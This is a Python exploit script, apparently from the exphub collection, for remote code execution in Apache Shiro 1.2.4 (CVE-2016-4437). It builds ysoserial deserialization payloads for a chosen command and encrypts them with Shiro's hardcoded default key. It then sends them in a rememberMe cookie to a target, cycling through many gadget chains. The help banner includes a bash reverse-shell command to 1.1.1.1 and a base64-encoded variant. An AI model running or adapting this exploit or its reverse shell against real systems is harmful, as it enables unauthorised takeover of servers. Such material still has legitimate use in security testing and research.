#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# author: zhzyker
# from: https://github.com/zhzyker/exphub
import os
import sys
import re
import base64
import uuid
import subprocess
import requests
from Crypto.Cipher import AES


JAR_FILE = 'ysoserial.jar'
	
def poc(url, command):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    payload = generator(command, JAR_FILE)
    header={
        'User-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
    }
    r = requests.get(target, headers=header, cookies={'rememberMe': payload.decode()}, timeout=10)

gadgets_list = ["CommonsBeanutils1","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","CommonsCollections7","Spring1","Spring2","Jdk7u21","JRMPClient","ROME","Clojure"]
key = "kPH+bIxk5D2deZiIxcaaaA=="

def generator(command, ysoserial=JAR_FILE):
    if not os.path.exists(ysoserial):
        raise Exception('ysoserial.jar file not found!')
    popen = subprocess.Popen(['java', '-jar', ysoserial, gadgets, command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
#   key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
if __name__ == '__main__':
    if len(sys.argv) == 3:
        url = sys.argv[1]
        command = sys.argv[2]
        print ("[*] Check Url: " + url)
        for gadgets in gadgets_list:
            poc(url, command)
            print ("[*] Use: " + gadgets)
        print ("[+] Use Key: " + key)
        print ("[+] The Payload Send Success, Please Check (No Rce Echo)")
    else:
        print('+-------------------------------------------------------------------------------------------------------+')
        print('+ DES: By zhzyker as https://github.com/zhzyker/exphub                                                  +')
        print('+      Vuln Name: CVE-2016-4437 | Shiro 550  |  Shiro 1.2.4                                             +')
        print('+                                                                                                       +')
        print('+      CommonsCollections1 - commons-collections:3.1  - 3.1-3.2.1, Need <  jdk1.8                       +')
        print('+      CommonsCollections2 - commons-collections4:4.0 - 4.0,       Need <= jdk7u21                      +')
        print('+      CommonsCollections3 - commons-collections:3.1  - 3.1-3.2.1, Need <= jdk7u21                      +')
        print('+      CommonsCollections4 - commons-collections4:4.0 - 4.0,       Need <= jdk7u21                      +') 
        print('+      CommonsCollections5 - commons-collections:3.1  - 3.1-3.2.1, Need == jdk1.8.x                     +')
        print('+      CommonsCollections6 - commons-collections:3.1  - 3.1-3.2.1, Need == jdk1.7 or jdk1.8             +')
        print('+      CommonsCollections7 - 3.1-3.2.1, Need == jdk1.7 or jdk1.8                                        +')
        print('+                                                                                                       +')
        print('+      Nc shell need encode command: http://www.jackson-t.ca/runtime-exec-payloads.html                 +')
        print('+      Original: bash -i >&/dev/tcp/1.1.1.1/233 0>&1                                                    +')
        print('+      Encoding: bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMjMzIDA+JjE=}|{base64,-d}|{bash,-i}  +')
        print('+-------------------------------------------------------------------------------------------------------+')
        print('+ USE: python3 <filename> <url> <command>                                                               +')
        print('+ EXP: python3 shiro-1.2.4_rce.py http://1.1.1.1:8080 "touch tmp/exphub"                                +')
        print('+ VER: Apahce Shiro <= 1.2.4                                                                            +')
        print('+-------------------------------------------------------------------------------------------------------+')
        sys.exit()
